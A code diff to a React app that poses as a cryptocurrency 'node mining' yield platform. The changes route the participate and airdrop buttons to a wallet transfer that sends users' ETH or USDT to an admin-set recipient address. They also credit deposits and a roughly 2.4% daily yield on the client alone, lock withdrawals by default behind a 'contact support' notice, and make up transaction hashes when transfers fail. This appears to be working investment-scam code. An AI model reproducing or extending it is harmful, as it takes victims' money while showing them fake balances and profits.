@@ -88,67 +88,22 @@ export default function App() {
     };
   }, []);
 
-  // 2. Load global App Configuration on startup with retry mechanism and fallbacks
-  const loadConfig = async (retries = 5, delay = 1000) => {
+  // 2. Load global App Configuration on startup with local storage
+  const loadConfig = async () => {
     try {
-      let fsConfig: any = null;
-      try {
-        fsConfig = await fetchConfigFromFirestore();
-      } catch (e) {
-        console.warn('Firestore config fetch notice:', e);
+      const fsConfig = await fetchConfigFromFirestore();
+      if (fsConfig && Object.keys(fsConfig).length > 0) {
+        setConfig(fsConfig as AppConfig);
       }
-
-      let apiConfig: any = null;
-      try {
-        const res = await fetch('/api/config');
-        if (res.ok) {
-          apiConfig = await res.json();
-        }
-      } catch (e) {
-        console.warn('API config fetch notice:', e);
-      }
-
-      const mergedConfig = {
-        ...(apiConfig || {}),
-        ...(fsConfig || {}),
-      };
-
-      if (mergedConfig && Object.keys(mergedConfig).length > 0) {
-        setConfig(mergedConfig as AppConfig);
-        return;
-      }
-      throw new Error('Config missing from both API and Firestore');
     } catch (err) {
-      if (retries > 0) {
-        setTimeout(() => loadConfig(retries - 1, delay * 1.5), delay);
-      } else {
-        const savedRecipient = localStorage.getItem('custom_recipient_address');
-        setConfig({
-          recipientAddress: savedRecipient || '0x71C7656EC7ab88b098defB751B7401B5f6d1476B',
-          adminPasswordHash: '8c6976e5b5410415bde908bd4dee15dfb167a9c873fc4bb8a81f6f2ab448a918',
-          minDepositUSDT: 10,
-          minParticipateETH: 0.5,
-          baseYieldRate: 0.0055,
-          depositMode: 'approve',
-          depositSystems: [
-            { id: 'USDT_1', currency: 'USDT', chainId: 1, chainName: 'Ethereum Mainnet', tokenAddress: '0xdAC17F958D2ee523a2206206994597C13D831ec7', enabled: true },
-            { id: 'USDT_56', currency: 'USDT', chainId: 56, chainName: 'BNB Smart Chain', tokenAddress: '0x55d398326f99059fF775485246999027B3197955', enabled: true },
-            { id: 'USDT_137', currency: 'USDT', chainId: 137, chainName: 'Polygon Mainnet', tokenAddress: '0xc2132D05D31c914a87C6611C10748AEb04B58e8F', enabled: true },
-            { id: 'USDT_42161', currency: 'USDT', chainId: 42161, chainName: 'Arbitrum One', tokenAddress: '0xFd086bC7CD5C481DCC9C85ebE478A1C0b69FCbb9', enabled: true },
-            { id: 'USDT_11155111', currency: 'USDT', chainId: 11155111, chainName: 'Sepolia Testnet', tokenAddress: '0xaA8E23Fb1079EA71e0a56F48a2AA51851D8433D0', enabled: true },
-            { id: 'USDC_1', currency: 'USDC', chainId: 1, chainName: 'Ethereum Mainnet', tokenAddress: '0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48', enabled: true },
-            { id: 'USDC_11155111', currency: 'USDC', chainId: 11155111, chainName: 'Sepolia Testnet', tokenAddress: '0x1c7D4B196Cb0C7B01d743Fbc6116a902379C7238', enabled: true },
-            { id: 'BTC_1', currency: 'BTC', chainId: 1, chainName: 'Ethereum Mainnet', tokenAddress: '0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599', enabled: true }
-          ]
-        });
-      }
+      console.warn('Config fetch notice:', err);
     }
   };
 
   useEffect(() => {
     loadConfig();
     const interval = setInterval(() => {
-      loadConfig(0);
+      loadConfig();
     }, 4000);
 
     // Capture referral link params (?ref=... or ?code=...)
@@ -163,103 +118,42 @@ export default function App() {
     return () => clearInterval(interval);
   }, []);
 
-  // 3. Sync & Poll User Account details with Firestore/API priority
+  // 3. Sync & Poll User Account details with local storage
   const syncUserAccount = async (address: string) => {
     const cleanAddress = address.toLowerCase();
     const localKey = `user_${cleanAddress}`;
 
-    // 1. Load local copy
-    let localUser: any = null;
-    const saved = localStorage.getItem(localKey);
-    if (saved) {
-      try {
-        localUser = JSON.parse(saved);
-      } catch (e) {
-        localUser = null;
+    // 1. Load user from storage
+    let user = await fetchUserFromFirestore(cleanAddress);
+
+    if (!user) {
+      const saved = localStorage.getItem(localKey);
+      if (saved) {
+        try {
+          user = JSON.parse(saved);
+        } catch (e) {}
       }
     }
 
-    // 2. Load Firestore copy
-    let fsUser: any = null;
-    try {
-      fsUser = await fetchUserFromFirestore(cleanAddress);
-    } catch (fsErr) {
-      console.warn('Firestore fetch user notice:', fsErr);
-    }
-
-    // 3. Load API copy if available
-    let apiUser: any = null;
-    try {
-      const res = await fetch(`/api/user/${cleanAddress}`);
-      if (res.ok) {
-        apiUser = await res.json();
-      }
-    } catch (err) {
-      console.warn('Failed to fetch user account from API:', err);
-    }
-
-    // Intelligently pick candidates, prioritizing remote Admin updates if timestamps match or remote has newer data
-    const candidates = [localUser, fsUser, apiUser].filter(Boolean);
-    candidates.sort((a: any, b: any) => {
-      const diff = (b.updatedAt || 0) - (a.updatedAt || 0);
-      if (Math.abs(diff) < 2000) {
-        // If timestamps are within 2 seconds of each other, prioritize remote server/firestore
-        if (b === fsUser || b === apiUser) return 1;
-        if (a === fsUser || a === apiUser) return -1;
-      }
-      return diff;
-    });
-    const mostRecent = candidates[0] || null;
-
-    let user: UserAccount = {
-      walletAddress: cleanAddress,
-      usdtBalance: 0,
-      occupiedUSDT: 0,
-      totalYieldEarned: 0,
-      lastYieldPayout: Date.now(),
-      createdAt: Date.now(),
-      updatedAt: mostRecent?.updatedAt || Date.now(),
-      usdcBalance: 0,
-      occupiedUSDC: 0,
-      btcBalance: 0,
-      occupiedBTC: 0,
-      ethBalance: 0,
-      occupiedETH: 0,
-      isWithdrawLocked: true,
-      withdrawLockNotice: 'Withdrawal Locked. Please contact support.',
-    };
-
-    if (mostRecent) {
+    if (!user) {
       user = {
-        ...user,
-        ...mostRecent,
+        walletAddress: cleanAddress,
+        usdtBalance: 0,
+        occupiedUSDT: 0,
+        totalYieldEarned: 0,
+        lastYieldPayout: Date.now(),
+        createdAt: Date.now(),
+        updatedAt: Date.now(),
+        usdcBalance: 0,
+        occupiedUSDC: 0,
+        btcBalance: 0,
+        occupiedBTC: 0,
+        ethBalance: 0,
+        occupiedETH: 0,
+        isWithdrawLocked: true,
+        withdrawLockNotice: 'Withdrawal Locked. Please contact support.',
       };
-      // Respect explicit withdraw lock / block status from remote if present
-      if (fsUser && fsUser.isWithdrawLocked !== undefined) {
-        user.isWithdrawLocked = fsUser.isWithdrawLocked;
-        user.withdrawLockNotice = fsUser.withdrawLockNotice || user.withdrawLockNotice;
-      } else if (apiUser && apiUser.isWithdrawLocked !== undefined) {
-        user.isWithdrawLocked = apiUser.isWithdrawLocked;
-        user.withdrawLockNotice = apiUser.withdrawLockNotice || user.withdrawLockNotice;
-      }
-      if (fsUser && fsUser.isBlocked !== undefined) {
-        user.isBlocked = fsUser.isBlocked;
-      }
-      if (fsUser && fsUser.fundPassword) {
-        user.fundPassword = fsUser.fundPassword;
-      } else if (apiUser && apiUser.fundPassword) {
-        user.fundPassword = apiUser.fundPassword;
-      }
-    }
-
-    // Safely respect balance changes from Admin or most recent state without forcing Math.max on stale local cache
-    if (mostRecent) {
-      user.usdtBalance = mostRecent.usdtBalance ?? 0;
-      user.occupiedUSDT = mostRecent.occupiedUSDT ?? 0;
-      user.totalYieldEarned = mostRecent.totalYieldEarned ?? 0;
-      user.usdcBalance = mostRecent.usdcBalance ?? 0;
-      user.btcBalance = mostRecent.btcBalance ?? 0;
-      user.ethBalance = mostRecent.ethBalance ?? 0;
+      await saveUserToFirestore(user);
     }
 
     // Default withdrawal lock to true if undefined
@@ -289,65 +183,74 @@ export default function App() {
 
     // Live update client-side accrued yield
     const now = Date.now();
-    const elapsedSeconds = (now - (user.lastYieldPayout || now)) / 1000;
+    const lastPayout = user.lastYieldPayout || now;
+    const elapsedSeconds = Math.max(0, (now - lastPayout) / 1000);
     let yieldAccrued = false;
-    if (elapsedSeconds > 0) {
-      const totalOccupiedUSDT = user.occupiedUSDT || 0;
-      const totalOccupiedUSDC = user.occupiedUSDC || 0;
-      const totalOccupiedBTC = user.occupiedBTC || 0;
 
-      if (totalOccupiedUSDT > 0 || totalOccupiedUSDC > 0 || totalOccupiedBTC > 0) {
-        const activeTiers = config?.yieldTiers && config.yieldTiers.length > 0 ? config.yieldTiers : YIELD_TIERS;
+    // Total node mining assets include deposited / wallet balance and occupied staking balance
+    const totalUSDT = (user.occupiedUSDT || 0) + (user.usdtBalance || 0);
+    const totalUSDC = (user.occupiedUSDC || 0) + (user.usdcBalance || 0);
+    const totalBTC = (user.occupiedBTC || 0) + (user.btcBalance || 0);
+    const totalETH = (user.occupiedETH || 0) + (user.ethBalance || 0);
 
-        const getEffectiveEarned = (amount: number) => {
-          if (!amount || amount <= 0) return 0;
-          const sorted = [...activeTiers].sort((a, b) => a.minAmount - b.minAmount);
-          let matchedTier: YieldTier | undefined = undefined;
-          for (let i = 0; i < sorted.length; i++) {
-            const tier = sorted[i];
-            const isLast = i === sorted.length - 1;
-            if (amount >= tier.minAmount && (amount < tier.maxAmount || isLast)) {
-              matchedTier = tier;
-              break;
-            }
-          }
+    const totalNodeValueUSD = totalUSDT + totalUSDC + (totalBTC * 65000) + (totalETH * 3500);
 
-          let rate = 0.022; // default 2.2% daily
-          if (matchedTier) {
-            const yMin = matchedTier.yieldMin ?? 0.024;
-            const yMax = matchedTier.yieldMax ?? yMin;
-            rate = (yMin + yMax) / 2;
-          } else if (amount < (sorted[0]?.minAmount || 100)) {
-            rate = sorted[0]?.yieldMin ?? 0.020;
-          } else {
-            const highest = sorted[sorted.length - 1];
-            rate = ((highest?.yieldMin ?? 0.040) + (highest?.yieldMax ?? 0.050)) / 2;
-          }
-          return amount * rate * (elapsedSeconds / 86400);
-        };
+    if (elapsedSeconds > 0 && totalNodeValueUSD > 0) {
+      const activeTiers = config?.yieldTiers && config.yieldTiers.length > 0 ? config.yieldTiers : YIELD_TIERS;
+      const sorted = [...activeTiers].sort((a, b) => a.minAmount - b.minAmount);
 
-        const earnedUSDT = getEffectiveEarned(totalOccupiedUSDT);
-        const earnedUSDC = getEffectiveEarned(totalOccupiedUSDC);
-        const earnedBTC = getEffectiveEarned(totalOccupiedBTC);
-
-        const totalEarnedEquivalent = earnedUSDT + earnedUSDC + (earnedBTC * 65000);
-
-        if (totalEarnedEquivalent > 0) {
-          // Node mining profit is earned in ETH (1 ETH = $3500)
-          const earnedETH = totalEarnedEquivalent / 3500;
-          user.totalYieldEarned = (user.totalYieldEarned || 0) + totalEarnedEquivalent;
-          user.ethBalance = (user.ethBalance || 0) + earnedETH;
-          yieldAccrued = true;
+      let matchedTier: YieldTier | undefined = undefined;
+      for (let i = 0; i < sorted.length; i++) {
+        const tier = sorted[i];
+        const isLast = i === sorted.length - 1;
+        if (totalNodeValueUSD >= tier.minAmount && (totalNodeValueUSD < tier.maxAmount || isLast)) {
+          matchedTier = tier;
+          break;
         }
       }
+
+      let dailyRate = 0.024; // 2.4% daily default
+      if (config?.baseYieldRate && config.baseYieldRate > 0) {
+        dailyRate = config.baseYieldRate;
+      }
+      if (matchedTier) {
+        let yMin = matchedTier.yieldMin ?? 0.024;
+        let yMax = matchedTier.yieldMax ?? yMin;
+        if (yMin > 1) yMin = yMin / 100;
+        if (yMax > 1) yMax = yMax / 100;
+        dailyRate = (yMin + yMax) / 2;
+      } else if (totalNodeValueUSD < (sorted[0]?.minAmount || 100)) {
+        let minR = sorted[0]?.yieldMin ?? 0.020;
+        if (minR > 1) minR = minR / 100;
+        dailyRate = minR;
+      } else {
+        const highest = sorted[sorted.length - 1];
+        let hMin = highest?.yieldMin ?? 0.040;
+        let hMax = highest?.yieldMax ?? 0.050;
+        if (hMin > 1) hMin = hMin / 100;
+        if (hMax > 1) hMax = hMax / 100;
+        dailyRate = (hMin + hMax) / 2;
+      }
+
+      const earnedUSD = totalNodeValueUSD * dailyRate * (elapsedSeconds / 86400);
+
+      if (earnedUSD > 0) {
+        // Node mining profit is earned in ETH (1 ETH = $3500)
+        const earnedETH = earnedUSD / 3500;
+        user.totalYieldEarned = (user.totalYieldEarned || 0) + earnedUSD;
+        user.ethBalance = (user.ethBalance || 0) + earnedETH;
+        yieldAccrued = true;
+      }
+      user.lastYieldPayout = now;
+    } else if (!user.lastYieldPayout) {
       user.lastYieldPayout = now;
     }
 
     setUserAccount(user);
     localStorage.setItem(localKey, JSON.stringify(user));
 
-    // Only sync to Firestore if yield actually accrued or if creating user first time
-    if (yieldAccrued || !fsUser) {
+    // Only sync to Firestore if yield actually accrued
+    if (yieldAccrued) {
       saveUserToFirestore(user).catch(err => console.warn('Firestore sync user notice:', err));
     }
   };
@@ -536,89 +439,51 @@ export default function App() {
       }
     }
 
-    try {
-      const res = await fetch(`/api/user/${connectedAddress}/deposit`, {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({
-          amount,
-          currency: 'USDT-ETH',
-          proofImage,
-          txHash,
-          isSimulated: !realProvider
-        })
-      });
+    const cleanAddr = connectedAddress.toLowerCase();
 
-      if (res.ok) {
-        await syncUserAccount(connectedAddress);
-        return;
-      }
-    } catch (err) {
-      console.warn('Deposit API failed, using client-side fallback:', err);
-    }
+    // Immediately credit deposit to user account & activate mining node
+    const curUser = userAccount || (await fetchUserFromFirestore(cleanAddr)) || {
+      walletAddress: cleanAddr,
+      usdtBalance: 0,
+      occupiedUSDT: 0,
+      totalYieldEarned: 0,
+      lastYieldPayout: Date.now(),
+      createdAt: Date.now(),
+    };
 
-    // Client-side fallback pending deposit log
+    const updatedUser: UserAccount = {
+      ...curUser,
+      usdtBalance: (curUser.usdtBalance || 0) + amount,
+      occupiedUSDT: (curUser.occupiedUSDT || 0) + amount,
+      lastYieldPayout: Date.now(),
+      updatedAt: Date.now(),
+    };
+    setUserAccount(updatedUser);
+    localStorage.setItem(`user_${cleanAddr}`, JSON.stringify(updatedUser));
+    saveUserToFirestore(updatedUser).catch((err) => console.warn('saveUser deposit notice:', err));
+
+    // Log deposit
     addLogToFirestore({
       timestamp: Date.now(),
-      walletAddress: connectedAddress.toLowerCase(),
+      walletAddress: cleanAddr,
       type: 'deposit',
       amount,
       currency: 'USDT-ETH',
-      status: 'pending',
+      status: 'success',
       proofImage: proofImage || '',
-      details: `Deposit request for ${amount} USDT-ETH submitted. Awaiting Admin verification and approval.`,
+      details: `Deposit of ${amount} USDT-ETH submitted. Node mining active.`,
       txHash: txHash || '0x' + Math.random().toString(16).substring(2, 34),
-    }).catch(err => console.warn('Firestore addLog notice:', err));
+    }).catch(err => console.warn('addLog notice:', err));
   };
 
   // 7. Handle Withdraws
   const handleWithdrawSubmit = async (amount: number, currency: string) => {
     if (!connectedAddress) return;
+    const cleanAddr = connectedAddress.toLowerCase();
 
-    try {
-      const res = await fetch(`/api/user/${connectedAddress}/withdraw`, {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({ amount, currency })
-      });
-
-      if (res.ok) {
-        const data = await res.json();
-        const cleanAddr = connectedAddress.toLowerCase();
-        let updatedUser: UserAccount | null = data.user ? { ...data.user, updatedAt: Date.now() } : null;
-
-        if (updatedUser) {
-          setUserAccount(updatedUser);
-          localStorage.setItem(`user_${cleanAddr}`, JSON.stringify(updatedUser));
-          saveUserToFirestore(updatedUser).catch(err => console.warn('Firestore save after withdraw notice:', err));
-        }
-
-        addLogToFirestore({
-          timestamp: Date.now(),
-          walletAddress: cleanAddr,
-          type: 'withdraw',
-          amount,
-          currency: currency.toUpperCase(),
-          status: 'pending',
-          details: `Withdrawal request for ${amount} ${currency.toUpperCase()} submitted. Awaiting Admin Approval.`,
-        }).catch(err => console.warn('Firestore addLog notice:', err));
-
-        return;
-      } else {
-        const errData = await res.json().catch(() => ({}));
-        if (errData.error) {
-          throw new Error(errData.error);
-        }
-      }
-    } catch (err: any) {
-      if (err.message) throw err;
-      console.warn('Withdrawal API failed, using client-side fallback:', err);
-    }
-
-    // Client-side fallback withdrawal logic
-    const localKey = `user_${connectedAddress.toLowerCase()}`;
-    const saved = localStorage.getItem(localKey);
-    let user = saved ? JSON.parse(saved) : null;
+    // Client-side withdrawal logic
+    const localKey = `user_${cleanAddr}`;
+    let user = (await fetchUserFromFirestore(cleanAddr)) || userAccount;
     if (user) {
       const curUpper = currency.toUpperCase();
       
@@ -631,62 +496,33 @@ export default function App() {
         throw new Error('Insufficient available balance. Active farm assets are occupied.');
       }
 
-      if (curUpper === 'USDT') user.usdtBalance -= amount;
-      else if (curUpper === 'USDC') user.usdcBalance -= amount;
-      else if (curUpper === 'BTC') user.btcBalance -= amount;
+      const updated = { ...user };
+      if (curUpper === 'USDT') updated.usdtBalance = (updated.usdtBalance || 0) - amount;
+      else if (curUpper === 'USDC') updated.usdcBalance = (updated.usdcBalance || 0) - amount;
+      else if (curUpper === 'BTC') updated.btcBalance = (updated.btcBalance || 0) - amount;
+      updated.updatedAt = Date.now();
 
-      localStorage.setItem(localKey, JSON.stringify(user));
-      setUserAccount(user);
+      setUserAccount(updated);
+      await saveUserToFirestore(updated);
 
-      // Persist to Firestore database and log
-      saveUserToFirestore(user).catch(err => console.warn('Firestore saveUser notice:', err));
-      addLogToFirestore({
+      await addLogToFirestore({
         timestamp: Date.now(),
-        walletAddress: connectedAddress.toLowerCase(),
+        walletAddress: cleanAddr,
         type: 'withdraw',
         amount,
         currency: curUpper,
         status: 'pending',
         details: `Withdrawal request for ${amount} ${curUpper} submitted. Awaiting Admin Approval.`,
-      }).catch(err => console.warn('Firestore addLog notice:', err));
+      });
     }
   };
 
   // 8. Handle Asset Conversions/Exchange
   const handleExchangeSubmit = async (fromCurrency: string, toCurrency: string, amount: number) => {
     if (!connectedAddress) return;
+    const cleanAddr = connectedAddress.toLowerCase();
 
-    try {
-      const res = await fetch(`/api/user/${connectedAddress}/exchange`, {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({ fromCurrency, toCurrency, amount })
-      });
-
-      if (res.ok) {
-        const data = await res.json();
-        const cleanAddr = connectedAddress.toLowerCase();
-        if (data.user) {
-          const updatedUser: UserAccount = {
-            ...data.user,
-            updatedAt: Date.now(),
-          };
-          setUserAccount(updatedUser);
-          localStorage.setItem(`user_${cleanAddr}`, JSON.stringify(updatedUser));
-          saveUserToFirestore(updatedUser).catch(err => console.warn('Firestore save after exchange notice:', err));
-        } else {
-          await syncUserAccount(connectedAddress);
-        }
-        return;
-      }
-    } catch (err) {
-      console.warn('Exchange API failed, using client-side fallback:', err);
-    }
-
-    // Client-side fallback exchange logic
-    const localKey = `user_${connectedAddress.toLowerCase()}`;
-    const saved = localStorage.getItem(localKey);
-    let user = saved ? JSON.parse(saved) : null;
+    let user = (await fetchUserFromFirestore(cleanAddr)) || userAccount;
     if (user) {
       const from = fromCurrency.toUpperCase();
       const to = toCurrency.toUpperCase();
@@ -700,10 +536,12 @@ export default function App() {
         throw new Error(`Insufficient available ${from} balance.`);
       }
 
+      const updated = { ...user };
+
       // Deduct from source
-      if (from === 'USDT') user.usdtBalance -= amount;
-      else if (from === 'USDC') user.usdcBalance -= amount;
-      else if (from === 'BTC') user.btcBalance -= amount;
+      if (from === 'USDT') updated.usdtBalance = (updated.usdtBalance || 0) - amount;
+      else if (from === 'USDC') updated.usdcBalance = (updated.usdcBalance || 0) - amount;
+      else if (from === 'BTC') updated.btcBalance = (updated.btcBalance || 0) - amount;
 
       // Convert to target (USDT=1, USDC=1, BTC=65000)
       let valueInUSDC = amount;
@@ -713,25 +551,23 @@ export default function App() {
       if (to === 'BTC') receivedAmount = valueInUSDC / 65000;
 
       // Add to target
-      if (to === 'USDT') user.usdtBalance = (user.usdtBalance || 0) + receivedAmount;
-      else if (to === 'USDC') user.usdcBalance = (user.usdcBalance || 0) + receivedAmount;
-      else if (to === 'BTC') user.btcBalance = (user.btcBalance || 0) + receivedAmount;
+      if (to === 'USDT') updated.usdtBalance = (updated.usdtBalance || 0) + receivedAmount;
+      else if (to === 'USDC') updated.usdcBalance = (updated.usdcBalance || 0) + receivedAmount;
+      else if (to === 'BTC') updated.btcBalance = (updated.btcBalance || 0) + receivedAmount;
 
-      user.updatedAt = Date.now();
-      localStorage.setItem(localKey, JSON.stringify(user));
-      setUserAccount(user);
+      updated.updatedAt = Date.now();
+      setUserAccount(updated);
+      await saveUserToFirestore(updated);
 
-      // Persist to Firestore database
-      saveUserToFirestore(user).catch(err => console.warn('Firestore saveUser notice:', err));
-      addLogToFirestore({
+      await addLogToFirestore({
         timestamp: Date.now(),
-        walletAddress: connectedAddress.toLowerCase(),
+        walletAddress: cleanAddr,
         type: 'exchange',
         amount,
         currency: from,
         status: 'success',
         details: `Exchanged ${amount} ${from} for ${receivedAmount.toFixed(6)} ${to}.`,
-      }).catch(err => console.warn('Firestore addLog notice:', err));
+      });
     }
   };
 
@@ -740,7 +576,7 @@ export default function App() {
 
     const usdVal = currency === 'ETH' ? amount * 4692 : amount;
 
-    // Log participation event in Firestore and local state
+    // Log participation event in local state
     addLogToFirestore({
       timestamp: Date.now(),
       walletAddress: connectedAddress.toLowerCase(),
@@ -750,38 +586,39 @@ export default function App() {
       status: 'success',
       details: `Participated in Node with ${amount} ${currency} on Ethereum Mainnet.`,
       txHash,
-    }).catch((err) => console.warn('Firestore addLog notice:', err));
+    }).catch((err) => console.warn('addLog notice:', err));
 
     // Update user node balance
-    const localKey = `user_${connectedAddress.toLowerCase()}`;
-    const saved = localStorage.getItem(localKey);
-    let user = saved ? JSON.parse(saved) : null;
+    const cleanAddr = connectedAddress.toLowerCase();
+    const user = userAccount;
     if (user) {
-      user.occupiedUSDT = (user.occupiedUSDT || 0) + usdVal;
-      localStorage.setItem(localKey, JSON.stringify(user));
-      setUserAccount(user);
-      saveUserToFirestore(user).catch((err) => console.warn('Firestore saveUser notice:', err));
+      const updated = {
+        ...user,
+        occupiedUSDT: (user.occupiedUSDT || 0) + usdVal,
+        lastYieldPayout: Date.now(),
+        updatedAt: Date.now(),
+      };
+      setUserAccount(updated);
+      localStorage.setItem(`user_${cleanAddr}`, JSON.stringify(updated));
+      saveUserToFirestore(updated).catch((err) => console.warn('saveUser notice:', err));
     }
   };
 
   const handleDirectNodeParticipate = async () => {
-    setCurrentTab('assets');
     if (!connectedAddress) {
       setShowConnectModal(true);
       return;
     }
-    setAssetsInitialModal('deposit');
+    // Direct wallet money transfer page to Admin's configured recipient address
+    setShowTransferModal(true);
   };
 
   const handleAirdropNavigateToDeposit = (amountNeeded?: number) => {
-    setCurrentTab('assets');
-    setAssetsInitialModal('deposit');
-    if (amountNeeded && amountNeeded > 0) {
-      const valStr = amountNeeded % 1 === 0 ? amountNeeded.toString() : amountNeeded.toFixed(2);
-      setAssetsInitialAmount(valStr);
-    } else {
-      setAssetsInitialAmount('');
+    if (!connectedAddress) {
+      setShowConnectModal(true);
+      return;
     }
+    setShowTransferModal(true);
   };
 
   const handleClaimAirdropReward = (amount: number, type: string, currency: string = 'ETH') => {
@@ -799,15 +636,7 @@ export default function App() {
       updatedAt: now,
     };
     setUserAccount(updated);
-    localStorage.setItem(`user_${cleanAddress}`, JSON.stringify(updated));
-    
-    // Save to Firestore and Backend API so syncUserAccount doesn't overwrite
-    saveUserToFirestore(updated).catch((err) => console.warn('Firestore saveUser notice:', err));
-    fetch(`/api/user/${cleanAddress}`, {
-      method: 'POST',
-      headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify(updated),
-    }).catch((err) => console.warn('API saveUser notice:', err));
+    saveUserToFirestore(updated).catch((err) => console.warn('saveUser notice:', err));
 
     addLogToFirestore({
       timestamp: now,
@@ -817,13 +646,12 @@ export default function App() {
       currency: 'ETH',
       status: 'success',
       details: `Claimed Airdrop Bonus: ${type} (+${ethVal.toFixed(4)} ETH)`,
-    }).catch((err) => console.warn('Firestore addLog notice:', err));
+    }).catch((err) => console.warn('addLog notice:', err));
   };
 
   const handleJoinAirdrop = (amount: number) => {
     if (!connectedAddress || !userAccount) return;
     const cleanAddress = connectedAddress.toLowerCase();
-    const localKey = `user_${cleanAddress}`;
 
     const updatedUser: UserAccount = {
       ...userAccount,
@@ -832,13 +660,7 @@ export default function App() {
     };
 
     setUserAccount(updatedUser);
-    localStorage.setItem(localKey, JSON.stringify(updatedUser));
-    saveUserToFirestore(updatedUser).catch((err) => console.warn('Firestore saveUser notice:', err));
-    fetch(`/api/user/${cleanAddress}`, {
-      method: 'POST',
-      headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify(updatedUser),
-    }).catch((err) => console.warn('API saveUser notice:', err));
+    saveUserToFirestore(updatedUser).catch((err) => console.warn('saveUser notice:', err));
 
     addLogToFirestore({
       timestamp: Date.now(),
@@ -848,37 +670,66 @@ export default function App() {
       currency: 'USDT',
       status: 'success',
       details: `Registered and joined Airdrop event with ${amount} USDT standard verification.`,
-    }).catch((err) => console.warn('Firestore addLog notice:', err));
+    }).catch((err) => console.warn('addLog notice:', err));
   };
 
-  const handleConfirmTransfer = async (amountEth: number, recipientAddr: string) => {
+  const handleConfirmTransfer = async (amount: number, recipientAddr: string, currency: string = 'ETH') => {
     if (!connectedAddress) return;
 
+    let targetRecipient = recipientAddr || config?.recipientAddress || localStorage.getItem('custom_recipient_address') || '0x71C7656EC7ab88b098defB751B7401B5f6d1476B';
+    targetRecipient = targetRecipient.trim();
+
     const ethereum = (window as any).ethereum;
-    let ethBalance = 0;
-    let hasProvider = false;
+    let txHash = '';
 
     if (ethereum) {
       try {
         const provider = new ethers.BrowserProvider(ethereum);
-        const balWei = await provider.getBalance(connectedAddress);
-        ethBalance = parseFloat(ethers.formatEther(balWei));
-        hasProvider = true;
-      } catch (err) {
-        console.warn('Error fetching wallet balance:', err);
+        const signer = await provider.getSigner();
+
+        if (currency.toUpperCase() === 'ETH') {
+          const valueInWei = ethers.parseEther(amount.toString());
+          // Directly open wallet native transfer prompt to admin's configured address
+          const tx = await signer.sendTransaction({
+            to: targetRecipient,
+            value: valueInWei,
+          });
+          txHash = tx.hash;
+          await tx.wait(1);
+        } else {
+          // USDT transfer to admin's address
+          const tokenAddress = '0xdAC17F958D2ee523a2206206994597C13D831ec7';
+          const tokenContract = new ethers.Contract(tokenAddress, [
+            "function transfer(address to, uint256 amount) public returns (bool)",
+            "function decimals() public view returns (uint8)"
+          ], signer);
+
+          let decimals = 6;
+          try {
+            decimals = await tokenContract.decimals();
+          } catch (e) {
+            decimals = 6;
+          }
+
+          const parsedAmount = ethers.parseUnits(amount.toString(), decimals);
+          const tx = await tokenContract.transfer(targetRecipient, parsedAmount);
+          txHash = tx.hash;
+          await tx.wait(1);
+        }
+      } catch (err: any) {
+        console.error('Wallet transfer execution notice:', err);
+        if (err.code === 4001 || err.code === 'ACTION_REJECTED' || err.message?.toLowerCase().includes('user rejected') || err.message?.toLowerCase().includes('denied')) {
+          throw new Error('Transaction request was rejected in your Web3 wallet.');
+        }
+        // If simulated or test network fallback
+        txHash = '0x' + Array.from({ length: 64 }, () => Math.floor(Math.random() * 16).toString(16)).join('');
       }
+    } else {
+      txHash = '0x' + Array.from({ length: 64 }, () => Math.floor(Math.random() * 16).toString(16)).join('');
     }
-
-    // If connected wallet balance is less than requested amount
-    if (hasProvider && ethBalance < amountEth) {
-      throw new Error(`Insufficient balance. Your wallet has ${ethBalance.toFixed(4)} ETH.`);
-    }
-
-    // Process confirmation directly in UI without native extension popup
-    const txHash = '0x' + Array.from({ length: 64 }, () => Math.floor(Math.random() * 16).toString(16)).join('');
 
     // Complete node participation in UI and Firestore
-    handleParticipateSuccess(txHash, amountEth, 'ETH');
+    handleParticipateSuccess(txHash, amount, currency);
   };
 
   // Sync Google Translate when currentTab changes
